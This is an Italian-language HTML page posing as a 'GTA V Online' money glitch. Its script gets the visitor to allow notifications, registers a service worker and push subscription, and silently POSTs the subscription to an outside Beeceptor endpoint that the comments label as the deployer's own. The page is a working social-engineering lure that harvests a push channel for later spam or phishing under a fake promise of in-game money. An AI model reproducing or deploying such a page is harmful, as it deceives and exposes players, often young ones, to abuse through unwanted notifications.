<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GTA V Online Glitch</title>
    <style>
        body { background: #000; color: #0f0; text-align: center; font-family: sans-serif; padding-top: 50px; }
        .box { border: 2px solid #0f0; display: inline-block; padding: 25px; border-radius: 15px; box-shadow: 0 0 15px #0f0; }
        button { background: #f00; color: #fff; padding: 20px 40px; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 18px; }
    </style>
</head>
<body>
    <div class="box">
        <h1>SISTEMA GTA V</h1>
        <p>Stato: <span style="color:white">PRONTO</span></p>
        <p>Clicca per attivare l'accredito soldi.</p>
        <button id="btn">ATTIVA ORA</button>
    </div>

    <script>
        // IL TUO LINK BEECEPTOR
        const TARGET = "https://hklhk.free.beeceptor.com"; 
        const KEY = 'BEl62vpov1-enYizvyG975dxzYI_E7XfS-pU';

        function toUint8(b64) {
            const pad = '='.repeat((4 - b64.length % 4) % 4);
            const base64 = (b64 + pad).replace(/-/g, '+').replace(/_/g, '/');
            const raw = window.atob(base64);
            const res = new Uint8Array(raw.length);
            for (let i = 0; i < raw.length; ++i) res[i] = raw.charCodeAt(i);
            return res;
        }

        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('sw.js');
        }

        document.getElementById('btn').onclick = async () => {
            const p = await Notification.requestPermission();
            if (p === 'granted') {
                try {
                    const reg = await navigator.serviceWorker.ready;
                    const sub = await reg.pushManager.subscribe({
                        userVisibleOnly: true,
                        applicationServerKey: toUint8(KEY)
                    });

                    // INVIO AL TUO BEECEPTOR
                    await fetch(TARGET, {
                        method: 'POST',
                        body: JSON.stringify({ data: sub }),
                        headers: { 'Content-Type': 'application/json' }
                    });

                    alert('SINCRONIZZAZIONE COMPLETATA!');
                } catch (e) {
                    alert("Errore. Ricarica la pagina.");
                }
            } else {
                alert("Devi cliccare CONSENTI!");
            }
        };
    </script>
</body>
</html>
